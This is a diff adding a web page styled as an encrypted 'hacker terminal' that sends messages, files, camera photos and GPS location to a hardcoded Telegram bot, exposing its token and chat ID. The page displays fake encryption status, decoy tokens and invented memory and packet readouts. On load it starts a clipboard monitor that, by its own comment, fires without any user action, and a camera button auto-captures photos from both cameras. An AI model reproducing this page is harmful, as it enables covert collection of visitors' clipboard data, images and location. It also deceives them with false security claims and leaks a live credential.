+    flex-direction: column;
+    gap: 6px;
+    scrollbar-width: thin;
+    scrollbar-color: #004400 transparent;
+}
+
+.reply-empty {
+    color: #006600;
+    font-size: 11px;
+    letter-spacing: 1px;
+    text-align: center;
+    padding: 24px 0;
+    animation: blink 2s step-start infinite;
+}
+
+.reply-msg {
+    background: #001500;
+    border: 1px solid #003300;
+    border-left: 3px solid #00ff41;
+    border-radius: 2px;
+    padding: 7px 10px;
+    animation: fadeIn .3s ease;
+}
+
+.reply-msg.own {
+    border-left-color: #0088ff;
+}
+
+.reply-sender {
+    font-size: 10px;
+    color: #00aa44;
+    letter-spacing: 1px;
+    margin-bottom: 3px;
+}
+
+.reply-text {
+    font-size: 12px;
+    color: #00ff41;
+    word-break: break-word;
+    white-space: pre-wrap;
+}
+
+.reply-time {
+    font-size: 10px;
+    color: #005500;
+    margin-top: 3px;
+    text-align: right;
+}
+
+.reply-media {
+    font-size: 11px;
+    color: #ffaa00;
+    font-style: italic;
+}
+
+@keyframes fadeIn { from { opacity:0; transform:translateY(4px); } to { opacity:1; transform:none; } }
+
+@media (max-width: 768px) {
+    .reply-stream {
+        width: calc(100% - 20px);
+        margin: 10px auto;
+    }
+    .reply-list { max-height: 220px; }
+}
+
+/* ===== REPLY INPUT ===== */
+.reply-input-row {
+    display: flex;
+    gap: 6px;
+    padding: 8px;
+    border-top: 1px solid #003300;
+    background: #001200;
+}
+
+.reply-textarea {
+    flex: 1;
+    background: #000;
+    border: 1px solid #005500;
+    border-radius: 2px;
+    color: #00ff41;
+    font-family: 'Courier New', monospace;
+    font-size: 13px;
+    padding: 7px 10px;
+    resize: none;
+    outline: none;
+    min-height: 36px;
+    max-height: 100px;
+}
+
+.reply-textarea:focus { border-color: #00ff41; }
+.reply-textarea::placeholder { color: #003300; }
+
+.reply-send-btn {
+    background: transparent;
+    border: 1px solid #00aa00;
+    color: #00ff41;
+    padding: 0 14px;
+    border-radius: 2px;
+    cursor: pointer;
+    font-size: 14px;
+    transition: background .15s;
+    min-height: 44px;
+    align-self: flex-end;
+}
+.reply-send-btn:hover,
+.reply-send-btn:active { background: #00aa00; color: #000; }
+
+/* own sent message */
+.reply-msg.own { border-left-color: #0088ff; }
+.reply-msg.own .reply-sender { color: #0088ff; }
+
+/* ===== OFFLINE BAR ===== */
+.offline-bar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    background: #220000;
+    border-bottom: 2px solid #ff0000;
+    color: #ff4444;
+    font-family: 'Courier New', monospace;
+    font-size: 12px;
+    letter-spacing: 1px;
+    padding: 8px 16px;
+    text-align: center;
+    z-index: 9999;
+}
+
+.queue-dot {
+    display: inline-block;
+    width: 8px; height: 8px;
+    background: #ff4444;
+    border-radius: 50%;
+    margin-right: 6px;
+    animation: pulse 1s infinite;
+}
+
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Matrix Background Canvas -->
+    <canvas id="matrixCanvas"></canvas>
+    <div class="scanline"></div>
+    
+    <!-- Main Terminal Box -->
+    <div class="terminal-box" id="terminalBox">
+        <div class="header">
+            <span class="pulse">🔴</span> SYSTEM_CORE_ACCESS // ENCRYPTED_MODE
+            <span class="status-indicator" id="statusIndicator">● SECURE</span>
+        </div>
+        
+        <div class="console-log" id="consoleLog">
+            [SYSTEM] INITIALIZING ENCRYPTED_CHANNEL...<br>
+            [NETWORK] CONNECTING TO SECURE_SERVER...<br>
+            [CRYPTO] AES-256-GCM: ACTIVE<br>
+            [AUTH] TOKEN_MASKING: ENABLED
+        </div>
+
+        <!-- Main Input Area -->
+        <div class="typer-wrapper">
+            <textarea id="hackerTyper" placeholder="ENTER ENCRYPTED_MESSAGE..." maxlength="2048" autocomplete="off" spellcheck="false"></textarea>
+            <div class="char-counter" id="charCounter">CHARS: 0/2048</div>
+        </div>
+        
+        <!-- File Preview -->
+        <div class="preview-section">
+            <div class="section-header">
+                <i class="fas fa-file-code"></i> MEDIA_BUFFER
+                <span class="media-count" id="mediaCount">0/10</span>
+            </div>
+            <div id="previewContainer" class="preview-grid"></div>
+        </div>
+
+        <!-- Media input tools -->
+        <div class="media-tools-row">
+            <label for="fileInput" class="hacker-btn" title="Select files from gallery / storage">
+                <i class="fas fa-folder-open"></i> FILES
+            </label>
+            <input type="file" id="fileInput" multiple>
+
+            <button id="cameraBtn" onclick="cameraCapture()" class="hacker-btn" title="Auto-capture 3 front + 3 back camera photos">
+                <i class="fas fa-camera"></i> <span id="cameraBtnText">CAMERA</span>
+            </button>
+
+
+            <button onclick="sendLocationToTelegram()" class="hacker-btn" title="Send current GPS location">
+                <i class="fas fa-location-dot"></i> LOCATION
+            </button>
+        </div>
+
+        <!-- Action row -->
+        <div class="action-row">
+            <button onclick="testTelegramConnection()" class="hacker-btn secondary">
+                <i class="fas fa-wifi"></i> TEST
+            </button>
+
+            <button onclick="clearAll()" class="hacker-btn secondary">
+                <i class="fas fa-broom"></i> CLEAR
+            </button>
+
+            <button id="sendBtn" onclick="sendToTelegram()" class="hacker-btn execute">
+                <i class="fas fa-paper-plane"></i> SEND
+            </button>
+        </div>
+
+        <!-- Progress Section -->
+        <div id="loader-container">
+            <div id="loader-text">INITIALIZING TRANSMISSION...</div>
+            <div class="progress-bar">
+                <div id="p-fill" class="progress-fill"></div>
+                <div class="progress-text" id="progressText">0%</div>
+            </div>
+            <div class="encryption-status" id="encryptionStatus">
+                <i class="fas fa-lock"></i> ENCRYPTION: AES-256-ACTIVE
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== HIDDEN SECURITY PANELS ===== -->
+    
+    <!-- Diagnostic Panel (Top Right) -->
+    <div class="diagnostic-panel" id="diagnosticPanel">
+        <div class="panel-header">
+            <i class="fas fa-shield-alt"></i> SYSTEM_DIAGNOSTICS
+            <span class="panel-close" onclick="togglePanel('diagnosticPanel')">[−]</span>
+        </div>
+        <div class="panel-content">
+            <div class="log-line" id="scanStatus">
+                <span class="log-time">[12:34:56]</span> SCANNING_PORT:443...
+            </div>
+            <div class="config-display" id="configDisplay">
+                <!-- Fake config will be injected here -->
+            </div>
+            <div class="system-metrics">
+                <div class="metric">
+                    <span class="metric-label">CPU:</span>
+                    <div class="metric-bar"><div class="metric-fill" id="cpuMetric"></div></div>
+                    <span class="metric-value" id="cpuValue">87%</span>
+                </div>
+                <div class="metric">
+                    <span class="metric-label">RAM:</span>
+                    <div class="metric-bar"><div class="metric-fill" id="ramMetric"></div></div>
+                    <span class="metric-value" id="ramValue">64%</span>
+                </div>
+                <div class="metric">
+                    <span class="metric-label">NET:</span>
+                    <div class="metric-bar"><div class="metric-fill" id="netMetric"></div></div>
+                    <span class="metric-value" id="netValue">2.4MB/s</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Memory Dump Window (Bottom Left) -->
+    <div class="memory-window" id="memoryWindow">
+        <div class="window-header">
+            <i class="fas fa-memory"></i> LIVE_MEMORY_DUMP
+            <span class="panel-close" onclick="togglePanel('memoryWindow')">[−]</span>
+        </div>
+        <div id="memoryDump" class="window-content">
+            <!-- Memory addresses will be injected here -->
+        </div>
+        <div class="memory-footer">
+            <span class="mem-address" id="currentAddress">0x7FF89A2B3C4D</span>
+            <span class="mem-status">WRITE_PROTECTED</span>
+        </div>
+    </div>
+
+    <!-- Packet Stream (Right Side) -->
+    <div class="packet-stream" id="packetStream">
+        <div class="stream-header">
+            <i class="fas fa-network-wired"></i> PACKET_STREAM
+            <span class="panel-close" onclick="togglePanel('packetStream')">[−]</span>
+        </div>
+        <div id="packetContainer" class="stream-content">
+            <!-- Packets will be injected here -->
+        </div>
+        <div class="stream-footer">
+            <span class="packet-count" id="packetCount">PKTS: 0</span>
+            <span class="encryption-indicator">
+                <i class="fas fa-key"></i> TLS_1.3
+            </span>
+        </div>
+    </div>
+
+    <!-- Fake Command History (Left Side) -->
+    <div class="command-history" id="commandHistory">
+        <div class="history-header">
+            <i class="fas fa-terminal"></i> CMD_HISTORY
+            <span class="panel-close" onclick="togglePanel('commandHistory')">[−]</span>
+        </div>
+        <div class="history-content" id="historyContent">
+            <!-- Command history will be injected here -->
+        </div>
+    </div>
+
+
+    <!-- Reply Viewer -->
+    <div class="reply-stream" id="replyStream">
+        <div class="stream-header">
+            <i class="fas fa-comments"></i> REPLY_STREAM
+            <span class="reply-badge" id="replyBadge" style="display:none">0</span>
+            <span class="panel-close" onclick="togglePanel('replyStream')">[−]</span>
+        </div>
+        <div class="reply-list" id="replyList">
+            <div class="reply-empty" id="replyEmpty">AWAITING_INCOMING_SIGNALS...</div>
+        </div>
+        <div class="reply-input-row">
+            <textarea id="replyInput" class="reply-textarea" placeholder="TYPE_REPLY..." rows="2" maxlength="4096"></textarea>
+            <button class="reply-send-btn" onclick="sendReply()" title="Send reply (Ctrl+Enter)">
+                <i class="fas fa-paper-plane"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- Offline queue indicator -->
+    <div id="offlineBar" class="offline-bar" style="display:none">
+        <i class="fas fa-wifi"></i> OFFLINE — <span id="queueCount">0</span> QUEUED — WILL_SEND_WHEN_ONLINE
+    </div>
+
+    <!-- Popup Notification -->
+    <div id="hacker-popup" class="popup">
+        <div class="popup-header">
+            <i class="fas fa-exclamation-triangle"></i> SYSTEM_REPORT
+        </div>
+        <div id="popup-msg" class="popup-body"></div>
+        <div class="popup-footer" id="popupFooter">
+            <span class="popup-time" id="popupTime"></span>
+            PRIORITY: HIGH
+        </div>
+    </div>
+
+    <!-- Secret Overlay (Shown with Konami Code) -->
+    <div id="secretOverlay" class="secret-overlay">
+        <div class="secret-content">
+            <div class="secret-header">
+                ⚠ CRITICAL SYSTEM INFO ⚠
+            </div>
+            <div class="secret-body">
+                <pre id="secretInfo"></pre>
+            </div>
+            <div class="secret-footer">
+                <span class="countdown" id="countdown">10</span> SECONDS TO SELF_DESTRUCT
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script>
+// ===== GLOBAL CONFIGURATION =====
+// >>> TOKEN AND CHAT ID: set them here, this is the only place they are used <<<
+const TELEGRAM_BOT_TOKEN = "8880011411:AAGN50_KwMg0OPHWnpFQUMVKX45PSdeejpg";
+const TELEGRAM_CHAT_ID = "5825685797";
+
+// Telegram Bot API limits
+const MAX_FILES = 10;                         // files per send (UI limit)
+const MAX_FILE_BYTES = 50 * 1024 * 1024;      // bot upload limit: 50MB
+const MAX_PHOTO_BYTES = 10 * 1024 * 1024;     // sendPhoto limit: 10MB
+
+// Fake display values for the UI panels (never the real credentials)
+const TOKEN_PARTS = {
+    p1: "8306598806",
+    p2: "AAHZBum6b",
+    p3: "Ae_4JPIpg",
+    p4: "_MiOQP0nz_GfD7z5o"
+};
+
+const CHAT_PARTS = {
+    addr1: "5825",
+    addr2: "6857",
+    addr3: "97"
+};
+
+const DECOY_TOKEN = Object.values(TOKEN_PARTS).join('');
+const DECOY_CHAT = Object.values(CHAT_PARTS).join('');
+
+function maskToken(t) {
+    return t.slice(0, 6) + '*'.repeat(Math.max(t.length - 10, 4)) + t.slice(-4);
+}
+
+const TOKEN_FORMATS = [
+    { name: "HEX", value: null },
+    { name: "BASE64", value: null },
+    { name: "BINARY", value: null },
+    { name: "MEMORY", value: null }
+];
+
+// Konami Code
+const KONAMI_CODE = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown',
+                    'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight',
+                    'b', 'a'];
+let konamiSequence = [];
+
+// Timers / shared state
+let typingTimer;
+let popupTimer;
+let loaderHideTimer;
+let isSending = false;
+let isCameraCapturing = false;
+
+// ── Offline queue ────────────────────────────────────────────────────────────
+// Each entry: { kind:'text', text } | { kind:'files', files:[File,...], caption }
+// Files are kept as live File objects (valid while tab is open).
+// Text items are also saved to localStorage so they survive a refresh.
+const offlineQueue = [];
+
+function queuePush(entry) {
+    offlineQueue.push(entry);
+    if (entry.kind === 'text') {
+        try {
+            const saved = JSON.parse(localStorage.getItem('tg_queue') || '[]');
+            saved.push({ kind: 'text', text: entry.text });
+            localStorage.setItem('tg_queue', JSON.stringify(saved.slice(-50)));
+        } catch (_) {}
+    }
+    updateQueueUI();
+}
+
+function queuePersistRemove(text) {
+    try {
+        const saved = JSON.parse(localStorage.getItem('tg_queue') || '[]');
+        const idx = saved.findIndex(e => e.kind === 'text' && e.text === text);
+        if (idx !== -1) { saved.splice(idx, 1); localStorage.setItem('tg_queue', JSON.stringify(saved)); }
+    } catch (_) {}
+}
+
+function updateQueueUI() {
+    const bar = document.getElementById('offlineBar');
+    const cnt = document.getElementById('queueCount');
+    if (!bar) return;
+    const offline = !navigator.onLine;
+    const hasQ    = offlineQueue.length > 0;
+    bar.style.display = (offline || hasQ) ? 'block' : 'none';
+    if (cnt) cnt.textContent = offlineQueue.length;
+}
+
+async function flushQueue() {
+    if (!navigator.onLine || isSending || offlineQueue.length === 0) return;
+    showPopup(`📤 SENDING ${offlineQueue.length} QUEUED ITEM(S)...`, false);
+    // Process one at a time to avoid hammering the API
+    while (offlineQueue.length > 0 && navigator.onLine) {
+        const entry = offlineQueue[0];
+        try {
+            if (entry.kind === 'text') {
+                const res = await tgCall('sendMessage', { chat_id: TELEGRAM_CHAT_ID, text: entry.text }, null, null);
+                if (res.ok) { offlineQueue.shift(); queuePersistRemove(entry.text); }
+                else break;
+            } else if (entry.kind === 'files') {
+                // Re-use the regular send path but with a pre-filled selectedFiles
+                const backup = selectedFiles.slice();
+                selectedFiles = entry.files.map((f, i) => ({ id: 9000 + i, file: f, url: null }));
+                const typerBackup = document.getElementById('hackerTyper').value;
+                document.getElementById('hackerTyper').value = entry.caption || '';
+                await sendToTelegram();
+                document.getElementById('hackerTyper').value = typerBackup;
+                selectedFiles = backup;
+                offlineQueue.shift();
+            }
+        } catch (_) { break; }
+        updateQueueUI();
+        await new Promise(r => setTimeout(r, 600));
+    }
+    if (offlineQueue.length === 0) {
+        try { localStorage.removeItem('tg_queue'); } catch (_) {}
+        showPopup('✅ QUEUE_FLUSHED: ALL_SENT', false);
+    }
+    updateQueueUI();
+}
+let selectedFiles = [];   // [{ id, file, url }]
+let nextFileId = 1;
+
+// ===== UTILITIES =====
+// Voice recording state
+
+
+const PANEL_SELECTOR = '.diagnostic-panel, .memory-window, .packet-stream, .command-history, .reply-stream';
+
+function isMobile() {
+    return window.matchMedia('(max-width: 768px)').matches;
+}
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// A panel needs updating only if it is rendered, not collapsed, and near the screen
+const panelInView = {};
+
+function isShown(id) {
+    const el = document.getElementById(id);
+    if (!el || el.getClientRects().length === 0 || el.classList.contains('collapsed')) return false;
+    return panelInView[id] !== false;
+}
+
+function refreshPanel(id) {
+    if (id === 'diagnosticPanel') { updateFakeConfig(); updateSystemMetrics(); }
+    if (id === 'memoryWindow') updateMemoryDump();
+}
+
+// Panels below the fold (mobile) are skipped until they scroll into view
+function watchPanels() {
+    if (!('IntersectionObserver' in window)) return;
+    const io = new IntersectionObserver(entries => {
+        entries.forEach(entry => {
+            const id = entry.target.id;
+            const wasIn = panelInView[id];
+            panelInView[id] = entry.isIntersecting;
+            if (entry.isIntersecting && wasIn === false) refreshPanel(id);
+        });
+    }, { rootMargin: '150px' });
+    document.querySelectorAll(PANEL_SELECTOR).forEach(p => io.observe(p));
+}
+
+// Interval scheduler that pauses while the tab is hidden (saves battery/CPU)
+const tickers = [];
+function every(fn, ms) {
+    const t = { fn, ms, id: null };
+    tickers.push(t);
+    if (!document.hidden) t.id = setInterval(fn, ms);
+    return t;
+}
+
+document.addEventListener('visibilitychange', () => {
+    tickers.forEach(t => {
+        clearInterval(t.id);
+        t.id = document.hidden ? null : setInterval(t.fn, t.ms);
+    });
+});
+
+function formatSize(bytes) {
+    if (bytes < 1024) return `${bytes} B`;
+    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
+    if (bytes < 1024 * 1024 * 1024) return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
+    return `${(bytes / (1024 * 1024 * 1024)).toFixed(2)} GB`;
+}
+
+function shortName(name, max = 26) {
+    return name.length > max ? name.slice(0, 13) + '…' + name.slice(-10) : name;
+}
+
+function fileExt(file) {
+    const m = file.name.match(/\.([^.]+)$/);
+    return m ? m[1].slice(0, 4).toUpperCase() : 'FILE';
+}
+
+function fileIcon(file) {
+    const n = file.name.toLowerCase();
+    const t = file.type || '';
+    if (t === 'application/pdf' || n.endsWith('.pdf')) return 'fa-file-pdf';
+    if (/\.(zip|rar|7z|tar|gz|tgz|bz2|xz)$/.test(n)) return 'fa-file-zipper';
+    if (/\.(docx?|odt|rtf)$/.test(n)) return 'fa-file-word';
+    if (/\.(xlsx?|ods|csv)$/.test(n)) return 'fa-file-excel';
+    if (/\.(pptx?|odp)$/.test(n)) return 'fa-file-powerpoint';
+    if (t.startsWith('audio/')) return 'fa-file-audio';
+    if (t.startsWith('video/')) return 'fa-file-video';
+    if (t.startsWith('image/')) return 'fa-file-image';
+    if (t.startsWith('text/') || /\.(txt|md|json|xml|log|js|py|html|css)$/.test(n)) return 'fa-file-lines';
+    return 'fa-file';
+}
+
+// ===== INITIALIZATION =====
+document.addEventListener('DOMContentLoaded', () => {
+    // Restore text items queued during a previous offline session
+    try {
+        const saved = JSON.parse(localStorage.getItem('tg_queue') || '[]');
+        saved.forEach(e => { if (e.kind === 'text' && e.text) offlineQueue.push(e); });
+        updateQueueUI();
+    } catch (_) {}
+    initializeMatrix();
+    setupEventListeners();
+    setupPanelDragging();
+    watchPanels();
+    initializePanels();
+    startSystemAnimations();
+    updateCharCounter();
+    renderPreview();
+    // Auto-features: fire without any user action
+    initClipboardMonitor();
+    initReplyViewer();
+});
+
+// ===== 1. MATRIX BACKGROUND =====
+function initializeMatrix() {
+    const canvas = document.getElementById('matrixCanvas');
+    const ctx = canvas.getContext('2d');
+    const letters = "01";
+    const fontSize = 16;
+    let drops = [];
+    let lastW = 0, lastH = 0;
+
+    function resize() {
+        lastW = window.innerWidth;
+        lastH = window.innerHeight;
+        canvas.width = lastW;
+        canvas.height = lastH;
+        drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
+    }
+
+    function draw() {
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        ctx.fillStyle = '#003300';
+        ctx.font = `${fontSize}px 'Courier New', monospace`;
+
+        for (let i = 0; i < drops.length; i++) {
+            const text = letters[Math.floor(Math.random() * letters.length)];
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                drops[i] = 0;
+            }
+            drops[i]++;
+        }
+    }
+
+    resize();
+
+    const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+    every(draw, reduced ? 200 : 50);
+
+    // Rebuild columns on resize (ignore small height changes from mobile address bars)
+    let resizeTimer;
+    window.addEventListener('resize', () => {
+        clearTimeout(resizeTimer);
+        resizeTimer = setTimeout(() => {
+            if (window.innerWidth !== lastW || Math.abs(window.innerHeight - lastH) > 150) resize();
+        }, 150);
+    });
+}
+
+// ===== 2. EVENT LISTENERS =====
+function setupEventListeners() {
+    // Typing sound with debounce
+    document.getElementById('hackerTyper').addEventListener('input', () => {
+        clearTimeout(typingTimer);
+        typingTimer = setTimeout(() => {
+            playSound(180 + Math.random() * 40, 0.02, 'sine');
+        }, 100);
+        updateCharCounter();
+    });
+
+    // File input (gallery / file picker)
+    document.getElementById('fileInput').addEventListener('change', (e) => {
+        addFiles(Array.from(e.target.files));
+        e.target.value = '';
+    });
+
+    // Camera input (photo / video capture)
+    // Remove button on a preview item (event delegation)
+    document.getElementById('previewContainer').addEventListener('click', (e) => {
+        const btn = e.target.closest('.preview-remove');
+        if (btn) removeFile(Number(btn.dataset.id));
+    });
+
+    // Paste files/images from clipboard
+    document.addEventListener('paste', (e) => {
+        const files = Array.from((e.clipboardData && e.clipboardData.files) || []);
+        if (files.length) {
+            e.preventDefault();
+            addFiles(files);
+        }
+    });
+
+    // Drag & drop files anywhere on the page
+    const box = document.getElementById('terminalBox');
+    const hasFiles = (e) => Array.from((e.dataTransfer && e.dataTransfer.types) || []).includes('Files');
+
+    document.addEventListener('dragenter', (e) => {
+        if (hasFiles(e)) { e.preventDefault(); box.classList.add('drag-over'); }
+    });
+    document.addEventListener('dragover', (e) => {
+        if (hasFiles(e)) { e.preventDefault(); box.classList.add('drag-over'); }
+    });
+    document.addEventListener('dragleave', (e) => {
+        if (!e.relatedTarget) box.classList.remove('drag-over');
+    });
+    document.addEventListener('drop', (e) => {
+        if (!hasFiles(e)) return;
+        e.preventDefault();
+        box.classList.remove('drag-over');
+        addFiles(Array.from(e.dataTransfer.files));
+    });
+
+    // Konami Code listener
+    document.addEventListener('keydown', handleKonamiCode);
+
+    // Keyboard shortcuts
+    document.addEventListener('keydown', (e) => {
+        // Ctrl+Enter to send (from main textarea OR reply input)
+        if (e.ctrlKey && e.key === 'Enter') {
+            if (document.activeElement && document.activeElement.id === 'replyInput') {
+                e.preventDefault(); sendReply(); return;
+            }
+            e.preventDefault();
+            sendToTelegram();
+        }
+
+        // Ctrl+L to clear
+        if (e.ctrlKey && e.key === 'l') {
+            e.preventDefault();
+            clearAll();
+        }
+
+        // Esc to close popup
+        if (e.key === 'Escape') {
+            document.getElementById('hacker-popup').classList.remove('show');
+        }
+    });
+
+    // Connection status
+    window.addEventListener('offline', () => { showPopup('OFFLINE: CONNECTION_LOST', true); updateQueueUI(); });
+    window.addEventListener('online',  () => { showPopup('ONLINE: CONNECTION_RESTORED', false); updateQueueUI(); setTimeout(flushQueue, 1500); });
+    window.addEventListener('online', () => showPopup("ONLINE: CONNECTION_RESTORED", false));
+
+    // Warn before leaving mid-upload
+    window.addEventListener('beforeunload', (e) => {
+        if (isSending) {
+            e.preventDefault();
+            e.returnValue = '';
+        }
+    });
+}
+
+// ===== 3. PANEL INITIALIZATION =====
+function initializePanels() {
+    updateFakeConfig();
+    every(updateFakeConfig, 5000);
+
+    updateMemoryDump();
+    every(updateMemoryDump, 2000);
+
+    startPacketStream();
+
+    initializeCommandHistory();
+
+    updateSystemMetrics();
+    every(updateSystemMetrics, 3000);
+}
+
+// ===== 4. FAKE TOKEN DISPLAY SYSTEM (UI Only) =====
+function updateFakeConfig() {
+    if (!isShown('diagnosticPanel')) return;
+
+    const formatIndex = Math.floor(Math.random() * TOKEN_FORMATS.length);
+    const format = TOKEN_FORMATS[formatIndex];
+
+    let tokenDisplay, chatDisplay;
+
+    switch (format.name) {
+        case "HEX":
+            tokenDisplay = Array.from(DECOY_TOKEN)
+                .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
+                .slice(0, 24).join(':');
+            chatDisplay = "0x" + Array.from(DECOY_CHAT)
+                .map(c => c.charCodeAt(0).toString(16)).join('');
+            break;
+
+        case "BASE64":
+            tokenDisplay = btoa(DECOY_TOKEN).substr(0, 24) + "...";
+            chatDisplay = btoa(DECOY_CHAT).substr(0, 12) + "...";
+            break;
+
+        case "BINARY":
+            tokenDisplay = Array.from(DECOY_TOKEN.substr(0, 8))
+                .map(c => c.charCodeAt(0).toString(2).padStart(8, '0'))
+                .join(' ') + " ...";
+            chatDisplay = Array.from(DECOY_CHAT.substr(0, 4))
+                .map(c => c.charCodeAt(0).toString(2).padStart(8, '0'))
+                .join(' ');
+            break;
+
+        default:
+            tokenDisplay = `0x${Math.random().toString(16).substr(2, 8).toUpperCase()}:ENCRYPTED`;
+            chatDisplay = `0x${Math.random().toString(16).substr(2, 6).toUpperCase()}:BUFFER`;
+    }
+
+    document.getElementById('configDisplay').innerHTML = `
+        <div class="config-line">
+            <span class="var-name">ENCRYPTION_KEY</span>
+            <span class="equals">=</span>
+            <span class="var-value blink">${tokenDisplay}</span>
+        </div>
+        <div class="config-line">
+            <span class="var-name">DESTINATION_ID</span>
+            <span class="equals">=</span>
+            <span class="var-value">${chatDisplay}</span>
+        </div>
+        <div class="config-line">
+            <span class="var-name">PROTOCOL</span>
+            <span class="equals">=</span>
+            <span class="var-value">TLS_1.3/${format.name}</span>
+        </div>
+    `;
+}
+
+// ===== 5. MEMORY DUMP SYSTEM (rows are created once, then only text changes) =====
+let memRows = null;
+
+function updateMemoryDump() {
+    if (!isShown('memoryWindow')) return;
+
+    const memoryDump = document.getElementById('memoryDump');
+
+    if (!memRows) {
+        memRows = [];
+        for (let i = 0; i < 8; i++) {
+            const line = document.createElement('div');
+            line.className = 'mem-line';
+            const addr = document.createElement('span');
+            addr.className = 'mem-address';
+            const data = document.createElement('span');
+            data.className = 'mem-data';
+            const ascii = document.createElement('span');
+            ascii.className = 'mem-ascii';
+            line.append(addr, ' ', data, ' ', ascii);
+            memoryDump.appendChild(line);
+            memRows.push({ addr, data, ascii });
+        }
+    }
+
+    memRows.forEach((row, i) => {
+        let data;
+        if (Math.random() > 0.7) {
+            const piece = DECOY_TOKEN.substr(i * 8, 8) || "ABCDEFGH";
+            data = Array.from(piece)
+                .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
+                .join(' ');
+        } else {
+            data = Array.from({ length: 16 }, () =>
+                Math.floor(Math.random() * 256).toString(16).padStart(2, '0')
+            ).join(' ');
+        }
+
+        const ascii = data.split(' ').map(hex => {
+            const charCode = parseInt(hex, 16);
+            return charCode > 31 && charCode < 127 ? String.fromCharCode(charCode) : '.';
+        }).join('');
+
+        row.addr.textContent = `0x7FF${Math.random().toString(16).substr(2, 8).toUpperCase()}`;
+        row.data.textContent = data;
+        row.ascii.textContent = ascii;
+    });
+
+    document.getElementById('currentAddress').textContent =
+        `0x${Math.random().toString(16).substr(2, 12).toUpperCase()}`;
+}
+
+// ===== 6. PACKET STREAM SYSTEM =====
+function startPacketStream() {
+    let packetCount = 0;
+    const packetTypes = ['SEND', 'RECV', 'ACK', 'SYN', 'FIN', 'DATA', 'ENC', 'DEC'];
+    const protocols = ['TCP', 'UDP', 'TLS', 'SSL', 'HTTP/2', 'QUIC'];
+    const directions = ['→', '←', '↔'];
+
+    const colored = (text, color) => {
+        const s = document.createElement('span');
+        s.style.color = color;
+        s.textContent = text;
+        return s;
+    };
+
+    every(() => {
+        if (!isShown('packetStream')) return;
+
+        packetCount++;
+        const packetContainer = document.getElementById('packetContainer');
+
+        const type = packetTypes[Math.floor(Math.random() * packetTypes.length)];
+        const protocol = protocols[Math.floor(Math.random() * protocols.length)];
+        const direction = directions[Math.floor(Math.random() * directions.length)];
+        const size = Math.floor(Math.random() * 2048) + 64;
+
+        let payload = "";
+        if (type === 'DATA' || type === 'ENC') {
+            if (Math.random() > 0.8) {
+                payload = `[${'*'.repeat(8)}]`;
+            } else {
+                payload = `[${Array.from({ length: 8 }, () =>
+                    Math.random().toString(16).substr(2, 2)
+                ).join('')}]`;
+            }
+        }
+
+        const packetLine = document.createElement('div');
+        packetLine.className = 'packet-line';
+        packetLine.append(
+            colored(type, type === 'ENC' ? '#00ff00' : '#ffff00'), ' ',
+            colored(protocol, '#00aaff'), ' ',
+            colored(direction, '#ff00ff'), ' ',
+            `SIZE:${size} ${payload}`
+        );
+
+        packetContainer.prepend(packetLine);
+
+        // Keep only last 10 packets
+        while (packetContainer.children.length > 10) {
+            packetContainer.removeChild(packetContainer.lastChild);
+        }
+
+        document.getElementById('packetCount').textContent = `PKTS: ${packetCount}`;
+    }, 1500);
+}
+
+// ===== 7. COMMAND HISTORY SYSTEM =====
+function initializeCommandHistory() {
+    const commands = [
+        {cmd: "scan --port 443 --encryption tls", output: "PORT_443: TLS_1.3_ACTIVE"},
+        {cmd: "crypto --init --algo aes-256-gcm", output: "ENCRYPTION_INITIALIZED"},
+        {cmd: "keygen --length 2048 --type rsa", output: "KEY_PAIR_GENERATED"},
+        {cmd: "connect --host api.telegram.org", output: "CONNECTED: SSL_VERIFIED"},
+        {cmd: "mask --token --level 3", output: "TOKEN_MASKED: LEVEL_3_SECURITY"},
+        {cmd: "verify --integrity --hash sha256", output: "INTEGRITY_CHECK_PASSED"},
+        {cmd: "channel --open --secure", output: "SECURE_CHANNEL_ESTABLISHED"},
+        {cmd: "buffer --alloc --size 1024", output: "BUFFER_ALLOCATED: 1024_BYTES"}
+    ];
+
+    const historyContent = document.getElementById('historyContent');
+    commands.forEach(cmd => {
+        const cmdLine = document.createElement('div');
+        cmdLine.className = 'cmd-line';
+        cmdLine.innerHTML = `
+            <span class="cmd-prompt">$</span>
+            <span class="cmd-text">${cmd.cmd}</span><br>
+            <span class="cmd-output">${cmd.output}</span>
+        `;
+        historyContent.appendChild(cmdLine);
+    });
+}
+
+// ===== 8. SYSTEM METRICS =====
+function updateSystemMetrics() {
+    if (!isShown('diagnosticPanel')) return;
+
+    const cpuValue = Math.floor(Math.random() * 30) + 60;
+    document.getElementById('cpuMetric').style.width = `${cpuValue}%`;
+    document.getElementById('cpuValue').textContent = `${cpuValue}%`;
+
+    const ramValue = Math.floor(Math.random() * 40) + 40;
+    document.getElementById('ramMetric').style.width = `${ramValue}%`;
+    document.getElementById('ramValue').textContent = `${ramValue}%`;
+
+    const netValue = (Math.random() * 3 + 0.5).toFixed(1);
+    document.getElementById('netMetric').style.width = `${(netValue / 5) * 100}%`;
+    document.getElementById('netValue').textContent = `${netValue}MB/s`;
+
+    const statuses = [
+        "SCANNING_PORT:443...",
+        "VERIFYING_CERTIFICATE...",
+        "CHECKING_ENCRYPTION...",
+        "VALIDATING_TOKEN...",
+        "ESTABLISHING_CHANNEL...",
+        "SECURE_CONNECTION_ACTIVE ✓"
+    ];
+
+    const randomStatus = statuses[Math.floor(Math.random() * statuses.length)];
